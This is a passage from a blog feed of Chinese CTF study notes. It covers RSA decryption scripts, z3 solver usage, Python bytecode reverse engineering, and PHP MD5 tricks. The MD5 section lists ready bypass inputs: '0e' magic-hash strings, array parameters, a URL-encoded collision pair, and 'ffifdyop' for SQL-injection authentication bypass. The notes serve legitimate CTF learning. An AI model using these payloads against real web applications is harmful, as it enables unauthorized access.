operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>d<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 逆元</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># 解密</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>m<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240129234351197.png\" alt=\"image-20240129234351197\" /></p>\n<h3 id=\"解密原理\"><a class=\"anchor\" href=\"#解密原理\">#</a> 解密原理</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> md5</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token number\">1325465431</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q<span class=\"token operator\">=</span><span class=\"token number\">152317153</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 欧拉函数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span> <span class=\"token comment\"># 互质</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 逆元</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag <span class=\"token operator\">=</span> md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"NSSCTF&#123;%s&#125;\"</span><span class=\"token operator\">%</span>flag<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"题型\"><a class=\"anchor\" href=\"#题型\">#</a> 题型</h3>\n<h2 id=\"md5\"><a class=\"anchor\" href=\"#md5\">#</a> MD5</h2>\n<h3 id=\"web用法\"><a class=\"anchor\" href=\"#web用法\">#</a> web 用法</h3>\n<ol>\n<li>\n<p><strong>md5 弱类型比较 ==（hash 比较缺陷 bypass）</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"0e12345\"</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"0e66666\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//true</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'240610708'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'QNKCDZ0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//true</span></pre></td></tr></table></figure><p>只要两个数的 md5 加密后的值以 0e 开头就可以绕过，因为 php 在进行弱类型比较（即 ==) 时，会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以 0e 开头会被认为是科学计数法，<strong>0e 后面加任何数在科学计数法中都是 0</strong>，所以两数相等，在进行严格比较（===）时才会先判断字符串类型是否相等，在比较。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>满足该条件的<span class=\"token constant\">MD5</span>值</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">240610708</span><span class=\"token punctuation\">:</span><span class=\"token number\">0e462097431906509019562988736854</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token constant\">QLTHNDT</span><span class=\"token punctuation\">:</span><span class=\"token number\">0e405967825401955372549139051580</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token constant\">QNKCDZO</span><span class=\"token punctuation\">:</span><span class=\"token number\">0e830400451993494058024219903391</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token constant\">PJNPDWY</span><span class=\"token punctuation\">:</span><span class=\"token number\">0e291529052894702774557631701704</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token constant\">NWWKITQ</span><span class=\"token punctuation\">:</span><span class=\"token number\">0e763082070976038347657360817689</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token constant\">NOOPCJF</span><span class=\"token punctuation\">:</span><span class=\"token number\">0e818888003657176127862245791911</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token constant\">MMHUWUV</span><span class=\"token punctuation\">:</span><span class=\"token number\">0e701732711630150438129209816536</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token constant\">MAUXXQC</span><span class=\"token punctuation\">:</span><span class=\"token number\">0e478478466848439040434801845361</span></pre></td></tr></table></figure></li>\n<li>\n<p><strong>md5 强类型比较 ===（md5 () 函数缺陷 bypass）</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//true</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">?</span>a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>b<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">//true</span></pre></td></tr></table></figure><p>md5 () 函数的描述是 <code>string md5(string $str[,bool $raw_output=false])</code></p>\n<p>md5 中需要的是一个 string 参数，但是当你<strong>传入一个 array (数组)<strong> 时，md5 () 是不会报错的，只是无法求出 array 的 md5 的值，这样就会</strong>导致任意的 2 个 array 的 md5 的值都会相等</strong></p>\n</li>\n<li>\n<p><strong>md5 碰撞</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!==</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'ok'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>真实 md5 碰撞，因为此时不能输入数组了，只能输入字符串</p>\n<p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p>\n</li>\n<li>\n<p><strong>sql 注入 + md5</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM flag WHERE password = '\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"hash4\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这需要一个极其特殊的 md5 的值 <strong>ffifdyop</strong></p>\n<p>这个字符串进行 md5 后恰好结果是 <code>’or’6?]??!r,??b</code> ，他的前四位为 <code>’or’</code> 正好满足 sql 注入查询的条件，因此可以完美绕过</p>\n</li>\n</ol>\n<h1 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h1>\n<h2 id=\"z3约束\"><a class=\"anchor\" href=\"#z3约束\">#</a> z3 约束</h2>\n<p><code>pip install z3-solver</code></p>\n<p>z3 中有 3 中类型的变量，分别是<strong>整型 (Int)</strong>，<strong>实型 (Real)</strong>，<strong>向量 (BitVec)</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a <span class=\"token operator\">=</span> Int<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#声明单个整型变量</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>a<span class=\"token punctuation\">,</span>b <span class=\"token operator\">=</span> Ints<span class=\"token punctuation\">(</span><span class=\"token string\">'a b'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#声明多个整型变量</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>a <span class=\"token operator\">=</span> Real<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#声明单个实型变量</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a<span class=\"token punctuation\">,</span>b <span class=\"token operator\">=</span> Reals<span class=\"token punctuation\">(</span><span class=\"token string\">'a b'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#声明多个实型变量</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>a <span class=\"token operator\">=</span> BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#声明单个 8 位的变量</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'a b'</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#声明多个 8 位的变量</span></pre></td></tr></table></figure><p>使用方法</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a<span class=\"token punctuation\">,</span>b <span class=\"token operator\">=</span> Ints<span class=\"token punctuation\">(</span><span class=\"token string\">'a b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>solve<span class=\"token punctuation\">(</span>a<span class=\"token operator\">></span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">&lt;</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>a<span class=\"token operator\">+</span>b<span class=\"token operator\">==</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#结果 [a = 5, b = 6]</span></pre></td></tr></table></figure><p>多个约束条件使用</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#-*- coding=utf-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a<span class=\"token punctuation\">,</span>b <span class=\"token operator\">=</span> Ints<span class=\"token punctuation\">(</span><span class=\"token string\">'a b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>solver <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#创建一个求解器对象</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>solver<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>b<span class=\"token operator\">==</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#用 add 方法添加约束条件</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>solver<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>a<span class=\"token operator\">-</span>b<span class=\"token operator\">==</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> solver<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> sat<span class=\"token punctuation\">:</span> <span class=\"token comment\">#check () 方法用来判断是否有解，sat (satisify) 表示满足有解</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    ans <span class=\"token operator\">=</span> solver<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#model () 方法得到解</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">#也可以用变量名作为下标得到解</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no ans!\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ljemZ5NTg1L2FydGljbGUvZGV0YWlscy8xMDg2NTQ2OTc=\">z3 约束求解器使用</span></p>\n",
            "tags": [
                "CTF",
                "CTF_Crypto"
            ]
        },
        {
            "id": "http://yoursite.com/CTF/Re/",
            "url": "http://yoursite.com/CTF/Re/",
            "title": "CTF_Reverse总结",
            "date_published": "2024-03-10T15:29:08.000Z",
            "content_html": "<hr />\n<hr />\n<h1 id=\"python逆向\"><a class=\"anchor\" href=\"#python逆向\">#</a> python 逆向</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzE2MTg=\">浅谈 ctf 中的 python 逆向</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMUpMNHkxcDdUdC8/c3BtX2lkX2Zyb209MzMzLjk5OS4wLjAmYW1wO3ZkX3NvdXJjZT01ZTlhYmUwZDQ4YjJmZDM5MjAxYjc3MDdhNWJhOWVjYw==\">【Python 逆向】浅谈 CTF-Python 逆向</span></p>\n<blockquote>\n<p>python 文件 ——(编译)——pyc 二进制字节码文件 (PyCodeObject 对象，可直接在虚拟机运行)</p>\n</blockquote>\n<p><strong>四种题型</strong></p>\n<ul>\n<li>\n<p><strong>pyc 文件</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>uncompyle6直接反编译</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pip install uncompyle6</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>uncpmpyle6<span class=\"token punctuation\">.</span>exe <span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>pyc</pre></td></tr></table></figure></li>\n<li>\n<p><strong>提供 txt 内含 pyc 字节码</strong></p>\n<p>运行在虚拟机 ( <code>python解释器</code> ) 内部的中间格式码</p>\n<p>opcode 查询 https://docs.python.org/zh-cn/3.7/library/dis.html</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>读py字节码</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>根据opcode文件查询操作意思</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>还原出python代码</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> dis</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> marshal</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>f<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"printname.pyc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>b_data<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PyCodeObjectData<span class=\"token operator\">=</span>b_data<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Pyobj<span class=\"token operator\">=</span>marshal<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>PyCodeObjectData<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dis<span class=\"token punctuation\">.</span>dis<span class=\"token punctuation\">(</span>Pyobj<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></li>\n<li>\n<p><strong>加花 pyc</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>根据uncompyle6和字节码判断花</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>读取co code长度——<span class=\"token builtin\">len</span>（code<span class=\"token punctuation\">.</span>co_code）</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>去花片修改co code 长度：010editor打开pyc文件</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4.</span>保存修改文件 uncompyle6反编译</pre></td></tr></table></figure></li>\n<li>\n<p><strong>打包成 exe 的 py 文件</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V4dHJlbWVjb2RlcnMtcmUvcHlpbnN0eHRyYWN0b3I=\">pyinstxtractor</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">.</span>pyinstxtractor<span class=\"token punctuation\">.</span>py脚本处理exe——变成结构体<span class=\"token operator\">+</span>文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  python pyinstxtractor<span class=\"token punctuation\">.</span>py <span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>exe</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">2.</span>修复时间属性和魔术字：将struct<span class=\"token punctuation\">.</span>pyc中的前<span class=\"token number\">12</span>位复制粘贴到<span class=\"token operator\">*</span><span class=\"token punctuation\">.</span>pyc中</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">3</span><span class=\"token punctuation\">.</span>uncompyle6</pre></td></tr></table></figure><blockquote>\n<p>修复规则</p>\n</blockquote>\n<ul>\n<li><code>在Python3.7及以上版本的编译后二进制文件中，头部除了四字节Magic Number，还有四个字节的空位和八个字节的时间戳+大小信息(16bytes)，后者对文件反编译没有影响，全部填充0即可；</code></li>\n<li><code>Python3.3 - Python3.7（包含3.3）版本中，只需要Magic Number和八位时间戳+大小信息(12bytes)</code></li>\n<li><code>Python3.3 以下的版本中，只有Magic Number和四位时间戳(8bytes)，用Winhex修复文件，在头部写入（非覆盖）上述格式的内容，就可以进行反编译了</code></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "CTF",
                "CTF_Reverse"
            ]
        },
        {
            "id": "http://yoursite.com/CTF/PWN/",
            "url": "http://yoursite.com/CTF/PWN/",
            "title": "CTF_PWN总结",
            "date_published": "2024-03-10T15:29:08.000Z",
            "content_html": "<hr />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wd25hYmxlLmtyL3BsYXkucGhw\">https://pwnable.kr/play.php</span></p>\n",
            "tags": [
                "CTF",
                "CTF_PWN"
            ]
        },
        {
            "id": "http://yoursite.com/CTF/Web/",
            "url": "http://yoursite.com/CTF/Web/",
            "title": "CTF-Web总结",
            "date_published": "2024-03-10T15:29:08.000Z",
